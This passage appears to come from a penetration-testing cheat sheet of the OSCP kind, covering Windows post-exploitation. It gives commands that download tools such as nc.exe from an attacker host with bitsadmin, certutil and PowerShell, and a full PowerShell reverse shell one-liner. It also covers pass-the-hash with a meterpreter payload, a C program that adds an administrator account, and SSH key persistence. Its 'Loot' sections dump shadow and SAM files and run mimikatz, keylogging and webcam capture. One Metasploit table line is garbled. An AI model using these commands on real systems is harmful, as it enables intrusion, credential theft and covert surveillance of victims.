$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```
### Windows download with bitsadmin
```cmd
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker>/nc.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\nc.exe
```
### Windows download with certutil.exe
```bash
certutil.exe -urlcache -split -f "http://<attacker>/Powerless.bat" Powerless.bat
```
### Creating a wget VB Script on Windows
[*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)

### Windows download with powershell
```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
```
### Windows Download from FTP
```bash
# In reverse shell
echo open $IP > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```
### Windows create SMB Server transfer files
```bash
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py

    # Or SMB service
    # http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
    vim /etc/samba/smb.conf
        [global]
        workgroup = WORKGROUP
        server string = Samba Server %v
        netbios name = indishell-lab
        security = user
        map to guest = bad user
        name resolve order = bcast host
        dns proxy = no
        bind interfaces only = yes

        [ica]
        path = /var/www/html/pub
        writable = no
        guest ok = yes
        guest only = yes
        read only = yes
        directory mode = 0555
        force user = nobody

    chmod -R 777 smb_path
    chown -R nobody:nobody smb_path
    service smbd restart

# Victim machine with reverse shell
Download: copy \\$IP\Lab\wce.exe .
Upload: copy wtf.jpg \\$IP\Lab
```
### Windows download with VBS
```cmd
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
```
### Pass The Hash
```bash
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp
```
### Scripts

#### Useradd
```c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
```
#### Powershell Run As
```cmd
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```
#### Powershell Reverse Shell
```cmd
Set-ExecutionPolicy Bypass

$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
### Windows privesc/enum tools
- [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

### Windows precompiled exploits
- [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
### Windows Port Forwarding
```sh
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

# Run in victim (5985 WinRM):
plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221
```
# Loot :
## Linux

### Passwords and hashes
```bash
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
### Dualhomed
```bash
ifconfig
ifconfig -a
arp -a
```
### Tcpdump
```bash
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not $IP and dst not $IP
tcpdump -vv -i eth0 src not $IP and dst not $IP
```
### Interesting files
```bash
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh/
.bash_history
```
### Databases
```
```
### SSH-Keys
```bash
mkdir /root/.ssh 2>/dev/null; echo '<your ssh-key>' >> /root/.ssh/authorized_keys
```
### Browser

### Mail
```bash
/var/mail
/var/spool/mail
```
### GUI
If there is a gui we want to check out the browser.
```bash
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```
## Windows

### Passwords and hashes
```bash
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```
### Dualhomed
```bash
ipconfig /all
route print

# What other machines have been connected
arp -a
```
### Tcpdump
```bash
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```
### Interesting files
```bash
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```
